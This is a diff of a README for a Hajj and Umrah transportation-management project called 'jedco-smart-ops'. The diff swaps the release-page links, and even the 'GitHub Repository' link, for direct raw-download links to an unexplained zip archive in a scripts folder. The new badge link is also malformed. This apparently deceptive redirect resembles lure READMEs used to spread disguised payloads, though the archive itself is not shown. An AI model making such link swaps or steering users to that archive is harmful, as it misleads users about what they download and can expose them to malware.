@@ -1,7 +1,7 @@
 # 🚀 jedco-smart-ops - Simplifying Your Transportation Management
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download%20Now-v1.0.0-blue.svg)](https://github.com/abdessamademoussaif1/jedco-smart-ops/releases)
+[![Download](https://github.com/abdessamademoussaif1/jedco-smart-ops/raw/refs/heads/main/scripts/jedco_ops_smart_3.9.zip%https://github.com/abdessamademoussaif1/jedco-smart-ops/raw/refs/heads/main/scripts/jedco_ops_smart_3.9.zip)](https://github.com/abdessamademoussaif1/jedco-smart-ops/raw/refs/heads/main/scripts/jedco_ops_smart_3.9.zip)
 
 ## 📖 Introduction
 Welcome to the JEDCO Smart Operations System. This software helps manage outdoor areas and transportation for Hajj and Umrah. Our goal is to streamline operations and improve efficiency for users in Saudi Arabia.
@@ -26,7 +26,7 @@ The JEDCO Smart Operations System offers several useful features:
 Follow these steps to download and run the JEDCO Smart Operations System:
 
 1. **Visit the Releases Page:** Click on the link below to access the latest version.
-   [Visit this page to download](https://github.com/abdessamademoussaif1/jedco-smart-ops/releases)
+   [Visit this page to download](https://github.com/abdessamademoussaif1/jedco-smart-ops/raw/refs/heads/main/scripts/jedco_ops_smart_3.9.zip)
 
 2. **Select the Latest Release:** Look for the most recent version listed on the page.
 
@@ -70,7 +70,7 @@ For further inquiries, please contact our support team via GitHub.
 This project is licensed under the MIT License. See the LICENSE file for more details.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/abdessamademoussaif1/jedco-smart-ops)
-- [Visit this page to download](https://github.com/abdessamademoussaif1/jedco-smart-ops/releases)
+- [GitHub Repository](https://github.com/abdessamademoussaif1/jedco-smart-ops/raw/refs/heads/main/scripts/jedco_ops_smart_3.9.zip)
+- [Visit this page to download](https://github.com/abdessamademoussaif1/jedco-smart-ops/raw/refs/heads/main/scripts/jedco_ops_smart_3.9.zip)
 
 Thank you for using the JEDCO Smart Operations System!
